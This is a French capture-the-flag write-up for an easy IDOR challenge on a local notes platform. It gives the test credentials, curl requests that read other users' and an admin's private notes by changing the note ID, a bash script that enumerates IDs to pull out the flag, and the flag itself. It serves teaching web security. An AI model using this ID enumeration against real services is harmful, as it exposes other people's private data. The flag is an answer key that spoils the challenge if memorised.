# 📝 Write-up — Notes Internes - IDOR

**Catégorie :** Web Security  
**Difficulté :** 🟢 Facile  
**Flag :** `GENTLE{ID0R_1n_Th3_AP1_P4r4m3t3r}`  
**Auteur :** echo  

---

# 📄 Énoncé du challenge

Vous avez obtenu un accès à la plateforme de notes internes d'une entreprise.  
En tant qu'employé normal, vous ne devriez pouvoir voir **que vos propres notes**, mais une faille semble permettre l’accès aux notes **confidentielles des administrateurs**.

🔐 Format du flag : `GENTLE{...}`

---

# 🌐 Accès au challenge

- URL : `http://localhost:8080`
- Comptes :
  - `john:password123`
  - `alice:alice2023`

---

# ✅ Étapes de résolution

---

## 🔍 Étape 1 — Connexion à l'application

Objectif : obtenir une session valide pour accéder à l’API.

### Connexion avec curl

```bash
curl -v -c cookies.txt -X POST http://localhost:8080/login   -d "username=john&password=password123"   -H "Content-Type: application/x-www-form-urlencoded"
```

**Résultat attendu :**

- Présence de `Set-Cookie: session=...`
- Le fichier `cookies.txt` contient désormais le cookie de session

---

## 🔍 Étape 2 — Découverte de la vulnérabilité IDOR

### Tester l’accès à la note de john (ID 4)

```bash
curl -b cookies.txt http://localhost:8080/api/note/4
```

Exemple de réponse :

```json
{
  "id": 4,
  "title": "Idées de projet",
  "content": "- Créer une nouvelle application\n- Optimiser la base de données\n- Tester les performances",
  "author": "john",
  "is_private": true
}
```

### Tester l’accès à une note d’un autre utilisateur (ID 3)

```bash
curl -b cookies.txt http://localhost:8080/api/note/3
```

➡️ **Résultat : on lit la note d’Alice → IDOR confirmé.**

### Tester les notes probables des administrateurs

```bash
curl -b cookies.txt http://localhost:8080/api/note/1
curl -b cookies.txt http://localhost:8080/api/note/2
```

---

## 🔍 Étape 3 — Exploitation complète (Flag)

### Extraire proprement la note 1

```bash
curl -s -b cookies.txt http://localhost:8080/api/note/1 | python -m json.tool
```

Contenu de la note :

```json
{
  "author": "admin",
  "content": "... Mot de passe temporaire: GENTLE{ID0R_1n_Th3_AP1_P4r4m3t3r} ...",
  "id": 1,
  "title": "Notes confidentielles"
}
```

### Extraire uniquement le flag

```bash
curl -s -b cookies.txt http://localhost:8080/api/note/1 | grep -o 'GENTLE{[^}]*}'
```

---

## 🛠️ Étape 4 — Script d'automatisation

```bash
#!/bin/bash
# script_exploit.sh

echo "[*] Connexion en tant que john..."
curl -s -c cookies.txt -X POST http://localhost:8080/login   -d "username=john&password=password123" > /dev/null

echo "[*] Recherche du flag dans les notes 1 à 10..."
for i in {1..10}; do
  echo -n "Test note $i... "
  result=$(curl -s -b cookies.txt http://localhost:8080/api/note/$i)

  if echo "$result" | grep -q "GENTLE{"; then
    echo "FLAG TROUVÉ !"
    echo "$result" | grep -o 'GENTLE{[^}]*}'
    exit 0
  else
    echo "pas de flag"
  fi
done

echo "[!] Flag non trouvé dans les 10 premières notes"
```

Exécution :

```bash
chmod +x script_exploit.sh
./script_exploit.sh
```

---

# 🎉 Flag trouvé

```
GENTLE{ID0R_1n_Th3_AP1_P4r4m3t3r}
```

---
